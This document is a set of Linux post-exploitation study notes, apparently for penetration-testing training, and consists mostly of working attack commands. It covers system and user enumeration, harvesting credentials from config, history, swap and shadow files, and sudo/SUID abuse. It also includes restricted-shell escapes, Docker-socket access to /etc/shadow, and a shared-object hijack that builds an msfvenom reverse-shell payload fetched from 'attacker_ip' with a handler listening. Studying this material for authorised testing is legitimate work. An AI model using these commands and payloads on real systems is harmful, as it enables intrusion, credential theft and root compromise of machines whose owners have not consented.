# Notes---Post-Exploitation
- First task is to gather additional information about the system, including users, permissions, installed applications, how software is configured, and other things about the system which will help us in our quest for root.
## Privilege Escalation
- Different types of information we will gather :
```bash
- System and Network Information
- User Information
- Privileged Access / Cleartext Credentials
- Services
- Jobs/Tasks
- Installed Software Version Information
```

#### System and Network Information
- Hostname --> command : `hostname`
- Kernel Version --> comamnd : `uname -a`
- Operating System :
```bash
Does our current OS have any known exploitable vulnerabilities?

cat /etc/issue
```
- IP address --> command : `ifconfig`
- Running Process --> command : `ps auxw`
- Network Routes:
```bash
Is our currently compromised machine routed to other networks? Can we use this information to pivot?

route -n
```
- DNS Server:
```bash
Can we obtain information from the DNS server? Active Directory Accounts, Zone Transfers, etc.

cat /etc/resolv.conf
```
- ARP cache:
```bash
Have other machines communicated with another target? Are the other machines accessible from the target?

arp -a
```
- Current Network Connections:
```bash
Are there any established connections from our machine to other machines and vice versa? Are the connections over encrypted or non-encrypted channels? Can we sniff the traffic of those connections?

netstat -auntp
```
#### User Information
- Current user permissions:
```bash
Can our current user access sensitive information/configuration details that belong to other users?

find / -user username
```
- UID and GID Information for all users:
```bash
How many users on the system? What groups do users belong to? Can we modify files belonging to users in other groups?


for user in $(cat /etc/passwd |cut -f1 -d":"); do id $user; done
```
- Last logged on users:
```bash
Who’s been on the system? From what systems? Can we pivot to those other systems using credentials we might already have?

last -a
```
- Root accounts:
```bash
How many UID 0 (root) accounts are on the system? Can we get credentials for any of them?

cat /etc/passwd |cut -f1,3,4 -d":" |grep "0:0" |cut -f1 -d":" |awk '{print $1}'
```
- Home Directories :
```bash
Do we have access to other users’ home directories? Is any of the information contained in those directories useful to us?

ls –als /home/*
```
#### Privileged Access / Cleartext Credentials
- Can the current user execute anything with elevated privileges? --> command = `sudo -l`
- Are there any setuid root (SUID) binaries on the system which may be vulnerable to privilege escalation?:
```bash
find / -perm -4000 -type f 2>/dev/null
```
- Can we read configuration files that might contain sensitive information, passwords, etc.?:
```bash
grep "password" /etc/*.conf 2> /dev/null
```
- Can we read the shadow file? If so, can we crack any of the hashes? --> `cat /etc/shadow`
- Can we list or read the contents of the /root directory? --> `ls -als /root`
- Can we read other users’ history files?:
```bash
find /* -name *.*history* -print 2>/dev/null
```
#### Services
- Which services are configured on the system and what ports are they opening?:
```bash
netstat -auntp
```
- Are service configuration files readable or modifiable by our current user?:
```bash
find /etc/init.d/ ! -uid 0 -type f 2>/dev/null |xargs ls -la
```
- Do the configuration files contain any information we can use to our advantage? (i.e.,credentials, etc.):
```bash
cat /etc/mysql/my.cnf
```
- Can we stop or start the service as our current user?:
```bash
service service_name start/stop
```
#### Jobs/Tasks
- What tasks or jobs is the system configured to run and at which times?:
```bash
cat /etc/crontab
ls -als /etc/cron.*
```
- Are there any custom jobs or tasks configured as root that world-writable?
```bash
find /etc/cron* -type f -perm - o+w -exec ls -l {} \;
```
####  Installed Software Version Information
- What software packages are installed on the system? --> `dpkg -l`
- What versions? Are the versions installed out-of-date and vulnerable to existing available exploits?:
```bash
dpkg –l
searchsploit "ttpd 2.2"
```
- LinEnum:
```bash
https://github.com/rebootuser/LinEnum
https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
```
- Transfer file by nc:
```bash
target machine : nc -nlvp 1234 > LinEnum.sh
my machine : nc -w 3 <target IP> 1234 < LinEnum.sh
```
- An important note about transferring files via `netcat` is that all traffic is unencrypted and may be detected by Intrusion Detection Systems or other anomalous traffic detection mechanisms implemented within an organization

### Cleartext Credentials in Configuration Files
-  `grep` command will search the /etc directory recursively (-r) for all .conf files containing the string "password" while sending errors to /dev/null:
```bash
grep -r password /etc/*.conf 2> /dev/null
```
- Find dotfiles files with "history" in their names (i.e., .bash_history):
```bash
find /* -name *.*history* -print 2> /dev/null
```
- Grep the apache access.log file for "user" and "pass" strings:
```bash
cat /var/log/apache/access.log |grep -E "^user|^pass"
```
- Dump cleartext Pre-Shared Wireless Keys from Network Manager:
```bash
cat /etc/NetworkManager/system-connections/* |grep -E "^id|^psk"
```
- As the www-data user to search for any PHP files or MySQL configuration files which might contain credentials to the database.
### SUID Binaries
- The reason that `ping` is configured as a SUID root binary, is that ping, by its very nature uses `raw sockets` to generate and receive ICMP packets and that activity requires root access.
- The `passwd` executable, responsible for enabling users to change their passwords, is also SUID root, due to the fact that it needs to write to the `/etc/passwd` and `/etc/shadow` files.
- SUID executable files on a Linux system:
```bash
find / -perm -4000 -type f 2>/dev/null

Executing 'find' on the root directory (/), looking for regular executable files (-type f) with the setuid permission (-perm -4000) set, and sending all errors (2) to /dev/null.
```
- The issue arises when we find a SUID root executable that takes some form of user input that isn’t properly checked or sanitized, which could result in a buffer overflow within that binary, resulting in our code (input) being executed as root.
- Another scenario could simply be a SUID root binary that just takes an argument as a command to execute, or takes an argument as a file to read, etc.
### Sudo Privileged Access
- A change is required in the `/etc/sudoers` configuration file.
-  `man` Arbitrary Command Execution via Pager Argument:
```bash
man -P "id" man
sudo man -P "cat /etc/shadow" man

The pager (-P) argument allows to run a command that we want
```
- Docker Sudo exploit:
```bash
https://github.com/pyperanger/dockerevil
```
### Restricted Shells
- A `chrooted jail` is a way to isolate users and users’ processes from the rest of the operating system.
- All programs defined for a chroot jail are run in their own directory structure, with their own shared libraries and environment settings.
- rbash when combined with a chroot jail, can be rather effective; however, many times, administrators rely on rbash alone, which opens up several ways we can break out of the restricted shell.
- Disabling restricted mode using the `set +r` or `set +o restricted` commands
- SHELL environment variable is set to `/bin/rbash` and our $PATH is also confined to the `/var/chroot/bin` directory.
- Restricted shell escape with Vi/VIM:
```bash
vi /tmp/test
  > :!sh <enter>
  
Getting a regular /bin/sh shell outside of our restricted rbash shell
```
- Restricted shell escape with "find":
```bash
find /home/bob -name test -exec /bin/sh \;

Command is looking for a file named "test" (-name test) in the /home/bob directory, and if found, will execute whatever follows the (-exec) switch.

NOTE: The above "find" trick will only work if the file "test" exists in the specified path (/home/bob). If it doesn’t exist, search for a known file, or create a file if needed.
```
-  Restricted shell escape with "python" or "perl":
```bash
python -c 'import pty; pty.spawn("/bin/sh")'
perl -e 'exec "/bin/sh";'
```
- Restricted shell escape from another system with SSH:
```bash
ssh restricted_user@targetserver –t "/bin/sh"


If we have SSH credentials to a system for a user that is configured with a restricted shell, we can try and break out the shell remotely from another system by trying to execute a shell with SSH before the restricted shell is initialized on the target
```
- Restricted Shell --> `https://www.google.com/search?q=%22Restricted+shell%22+++%22pentesting%22&oq=%22Restricted+shell%22+++%22pentesting%22`
### Cracking the Shadow
- SHA-512, and can be quickly recognized by the "$6$"
- MD5 ($1$) hashes will be easiest to crack.
- SHA-256 ($5$) and SHA-512 ($6$) may be a bit more difficult.
- Unshadow takes both the /etc/passwd and /etc/shadow files and combines them into a format compatible for cracking with John:
```bash
unshadow passwd shadow > shadow.john

john shadow.john --wordlist=/usr/share/wordlists/custom_words.txt
```
- `MimiPenguin`
```bash
https://github.com/huntergregal/mimipenguin
```
- MimiPenguin works similarly to the well-known “mimikatz” for Windows, but is designed for Linux and attempts to dump cleartext credentials from memory from the following applications:
```
GDM password (Kali Desktop, Debian Desktop)
Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop)
VSFTPd (Active FTP Connections)
Apache2 (Active HTTP Basic Auth Sessions)
OpenSSH (Active SSH Sessions - Sudo Usage)
```
### Pilfering Credentials From Swap Memory
- Dump sensitive information from the swap file
- This has to be done as the root account, and may also be prone to false-positives as it’s difficult to ascertain exactly where in swap memory sensitive information will be temporarily stored.
- `swap file` can be found with:
```bash
swapon -s
"or"
cat /proc/swaps

res = /dev/sda5

Now extract the information

strings /dev/sda5 | grep "password="
strings /dev/sda5 | grep "&password="
```
- `swap_digger.sh` automate searching for common sensitive strings within the swap file:
```
https://github.com/sevagas/swap_digger
```
### Code Execution via Shared Object Library Loading
- Similar to Microsoft Windows’ Dynamic-Link library (DLL), Shared Object libraries are essentially their equivalent on Linux systems, providing applications with functions that are called from outside of an application by referencing .so files at an applications’ runtime.
- Two primary types of shared object libraries:
```bash
Static Libraries(.a) – Code that is compiled into an application.
Dynamically Linked Shared Object Libraries (.so) – These can either be linked to the application at runtime or loaded or unloaded and linked during an applications’ execution.

More info:
http://www.yolinux.com/TUTORIALS/LibraryArchives-StaticAndDynamic.html
```
- It will search for those Shared Objects in:
```bash
1.Any directories specified by -rpath-link options. (RPATH)
2.Any directories specified by -rpath options. (RPATH)
3.If the -rpath and -rpath-link options are not used, it will then search the contents of the environment variables LD_RUN_PATH and LD_LIBRARY_PATH.
4.Directories defined in the DT_RUNPATH environment variable first, if that doesn’t exist, then the DT_RPATH
5.Then, the default lib directories, normally /lib and /usr/lib.
6.Finally, any directories defined in the /etc/ld.so.conf file.
```
- We can determine the shared object libraries that are being loaded by an executable with the `ldd` command:
```bash
ldd /usr/local/bin/program
```
- What we’re looking for with the previous ldd output is to see if we can hijack any of the Shared Objects the executable is linking once we’ve determined if the executable was compiled with RPATH or RUNPATH options.
- If we find that the executable was in fact compiled with RPATH or RUNPATH options, we will be able to drop our payload in the directories defined by either of those options
- For determining whether an executable was compiled with RPATH or RUNPATH options, we can use the `objdump`:
```bash
objdump -x /usr/local/bin/program | grep RPATH
objdump -x /usr/local/bin/program | grep RUNPATH

Output:

RPATH /tmp/program/libs
RUNPATH /tmp/program/libs
```
- Having determined that the program executable was compiled with RPATH options pointing to /tmp/program/libs, and we also know that RPATH is checked for linked Shared Objects before the /lib or /usr/lib directories, we can place our `malicious .so` file in the /tmp/program/libs directory, and it should be executed whenever the executable is launched.
- `ldd /usr/local/bin/program`
- Pick any of the above and create a shared object with a similar name of any of them.
- For example `program.so` object for the name of our malicious shared object file
```bash
msfvenom -a x64 -p linux/x64/shell_reverse_tcp LHOST=<attacker IP> LPORT=<attacker LPORT> -f elf-so -o program.so

https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom
```
- Tranfer the file malicious and RPATH option was /tmp/program/libs:
```
my shell : python3 -m http.server 80

target shell : cd /tmp/program/libs && wget http://attacker_ip/program.so
```
- Listening on my shell:
```bash
msf > use exploit/multi/handler
msf exploit(multi/handler) > set payload linux/x64/shell_reverse_tcp
msf exploit(multi/handler) > set LHOST <attacker_ip>
msf exploit(multi/handler) > set LPORT <attacker_lport>
msf exploit(multi/handler) > exploit -j
```
- To elevate our privileges with this vulnerability, it is required that the shared object via executing the program, be executed by a user with higher privileges, or scheduled as part of a cron job that runs as root, etc.
### Introduction to Kernel Exploits
- Dirty Cow – Existed in Kernel versions since 2.6.22 (2007) and fixed in 2016:
```bash
https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
```
- Stack Clash (Multiple Distributions/Kernels)
```bash
https://blog.qualys.com/
```
- DCCP Double-Free Privilege Escalation (4.4.0 kernel / Ubuntu)
```bash
https://www.exploit-db.com/exploits/41458
```
- Race Condition Privilege Escalation (Linux kernel < 4.10.15)
```bash
https://www.exploit-db.com/exploits/43345
```
- Different categories of kernel exploits:
```bash
• Buffer Overflows
• Memory Corruption 
• Denial-Of-Service
• Race Conditions
```
- If our target is of a 32bit architecture and doesn’t have gcc installed, and we need to compile the exploit on our 64bit attacker machine.
- specifying the (-m32) flag to gcc:
```bash
gcc -m32 exploit.c -o exploit
```
- There is a relatively new exploit framework designed for Linux and Mac targets known as Kernelpop.
```bash
https://github.com/spencerdodd/kernelpop
```
- Kernel Exploit Repositories:
```bash
https://github.com/SecWiki/linux-kernel-exploits
https://github.com/lucyoa/kernel-exploits
```
### Unix Socket Exploitation
- An insufficiently secured Unix socket is Docker.
```bash
https://docs.docker.com/engine/install/linux-postinstall/

By design, the docker daemon binds to a Unix socket instead of a TCP port.
```
- By default, that Unix socket is owned by the user root; additionally, the docker daemon always runs as the root user.
- Suppose a user is an unprivileged user and has access to the docker command (he is part of docker group)
```bash
https://betterprogramming.pub/about-var-run-docker-sock-3bfd276e12fd
```
- Try to access /etc/shadow. Connecting to the docker socket (running as root) as user "nonroot".
```bash
docker run -v /etc/shadow:/docker/hashedpasswords -d postgres
docker exec -ti {CONTAINER_ID} bash
root@XXXXXXXXXXXX:/# cat /docker/hashedpasswords > /docker/test.txt
root@XXXXXXXXXXXX:/# chmod 777 /docker/test.txt
root@XXXXXXXXXXXX:/# cat /docker/test.txt
```
